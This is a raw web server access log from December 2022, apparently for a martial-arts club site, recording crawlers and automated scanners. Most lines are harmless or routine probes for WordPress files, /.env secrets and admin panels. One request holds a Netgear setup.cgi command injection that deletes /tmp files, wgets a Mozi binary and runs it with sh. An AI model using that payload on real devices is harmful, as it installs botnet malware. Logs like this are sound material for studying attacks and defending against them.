::ffff:109.123.236.65 - - [06/Dec/2022:08:45:15 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:15 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:16 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:16 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:16 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:16 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:16 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:17 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:17 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:17 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:17 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:17 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:18 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:18 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:18 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:18 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:18 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:19 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:19 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:157.55.39.214 - - [06/Dec/2022:08:58:06 +0000] "GET /overview.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.93.253.46 - - [06/Dec/2022:09:00:00 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:94.102.61.8 - - [06/Dec/2022:09:14:33 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "python-requests/2.26.0"
::ffff:94.102.61.8 - - [06/Dec/2022:09:14:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "python-requests/2.26.0"
::ffff:95.214.235.205 - - [06/Dec/2022:09:16:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [06/Dec/2022:09:16:15 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:09:17:20 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:1.14.7.100 - - [06/Dec/2022:09:23:34 +0000] "GET /msoosboos.aspx HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:14.116.152.84 - - [06/Dec/2022:09:32:52 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:43.129.97.125 - - [06/Dec/2022:09:35:15 +0000] "GET / HTTP/1.1" 200 57378 "-" "'Mozilla/5.0"
::ffff:141.255.166.2 - - [06/Dec/2022:09:45:12 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:40.77.167.4 - - [06/Dec/2022:09:57:27 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:183.136.225.32 - - [06/Dec/2022:10:04:18 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:183.136.225.32 - - [06/Dec/2022:10:10:56 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [06/Dec/2022:10:10:58 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [06/Dec/2022:10:10:58 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:198.58.99.216 - - [06/Dec/2022:10:11:06 +0000] "GET / HTTP/1.1" 200 57378 "-" "Netwalk research scanner - netwalk.ankweb.exposed -"
::ffff:183.136.225.32 - - [06/Dec/2022:10:11:50 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:5.188.210.227 - - [06/Dec/2022:10:23:54 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 147 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:114.119.135.98 - - [06/Dec/2022:10:25:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.246.189 - - [06/Dec/2022:10:28:34 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [06/Dec/2022:10:28:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.255.166.2 - - [06/Dec/2022:10:40:57 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:73.93.253.46 - - [06/Dec/2022:10:41:19 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:95.214.235.205 - - [06/Dec/2022:10:49:12 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [06/Dec/2022:10:49:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:10:58:38 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:157.55.39.214 - - [06/Dec/2022:11:00:08 +0000] "GET /overview.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:192.241.210.7 - - [06/Dec/2022:11:02:34 +0000] "GET /manager/text/list HTTP/1.1" 404 156 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:141.255.166.2 - - [06/Dec/2022:11:06:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:73.93.253.46 - - [06/Dec/2022:11:15:58 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:114.119.158.156 - - [06/Dec/2022:11:18:09 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:161.35.117.6 - - [06/Dec/2022:11:31:35 +0000] "GET /ab2g HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:161.35.117.6 - - [06/Dec/2022:11:31:35 +0000] "GET /ab2h HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:161.35.117.6 - - [06/Dec/2022:11:31:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.254.196.115 - - [06/Dec/2022:11:35:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [06/Dec/2022:11:35:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.193.146 - - [06/Dec/2022:11:52:15 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:73.93.253.46 - - [06/Dec/2022:12:05:51 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:54.36.112.44 - - [06/Dec/2022:12:14:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [06/Dec/2022:12:14:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /99vt HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /99vu HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /99vt HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:3.236.125.122 - - [06/Dec/2022:12:22:05 +0000] "GET /99vu HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:157.55.39.153 - - [06/Dec/2022:12:25:27 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:167.248.133.63 - - [06/Dec/2022:12:28:49 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.63 - - [06/Dec/2022:12:28:49 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.63 - - [06/Dec/2022:12:28:49 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.63 - - [06/Dec/2022:12:28:50 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:73.93.253.46 - - [06/Dec/2022:12:38:50 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:135.125.246.189 - - [06/Dec/2022:12:43:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [06/Dec/2022:12:43:55 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:120.85.117.89 - - [06/Dec/2022:12:53:58 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:73.93.253.46 - - [06/Dec/2022:12:56:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:66.240.236.109 - - [06/Dec/2022:13:05:03 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:180.243.12.36 - - [06/Dec/2022:13:06:50 +0000] "GET /wp-content/themes/seotheme/db.php?u HTTP/1.1" 404 172 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:180.243.12.36 - - [06/Dec/2022:13:06:51 +0000] "GET /wp-content/themes/seotheme/db.php?u HTTP/1.1" 404 172 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:185.191.171.13 - - [06/Dec/2022:13:11:07 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.20 - - [06/Dec/2022:13:11:07 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:141.255.166.2 - - [06/Dec/2022:13:12:00 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:73.93.253.46 - - [06/Dec/2022:13:13:30 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:40.77.167.4 - - [06/Dec/2022:13:33:07 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [06/Dec/2022:13:40:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [06/Dec/2022:13:40:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:14:05:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:51.120.3.88 - - [06/Dec/2022:14:20:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.120.3.88 - - [06/Dec/2022:14:20:39 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:14:23:13 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:128.14.134.170 - - [06/Dec/2022:14:26:30 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:114.119.135.53 - - [06/Dec/2022:14:34:16 +0000] "GET /resources HTTP/1.1" 200 194907 "http://www.wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:73.93.253.46 - - [06/Dec/2022:14:40:33 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:34.214.123.229 - - [06/Dec/2022:14:43:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.164.148.244 - - [06/Dec/2022:14:43:28 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.211.170.141 - - [06/Dec/2022:14:43:47 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.221.31.156 - - [06/Dec/2022:14:43:54 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.221.31.156 - - [06/Dec/2022:14:43:56 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.202.200.154 - - [06/Dec/2022:14:44:46 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.213.41.237 - - [06/Dec/2022:14:44:58 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:114.119.132.183 - - [06/Dec/2022:14:48:56 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:185.191.171.19 - - [06/Dec/2022:14:53:39 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.2 - - [06/Dec/2022:14:53:39 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:34.218.58.44 - - [06/Dec/2022:14:55:21 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:14:57:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:135.125.246.189 - - [06/Dec/2022:14:59:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [06/Dec/2022:14:59:09 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.166.89.222 - - [06/Dec/2022:14:59:21 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.166.89.222 - - [06/Dec/2022:14:59:21 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
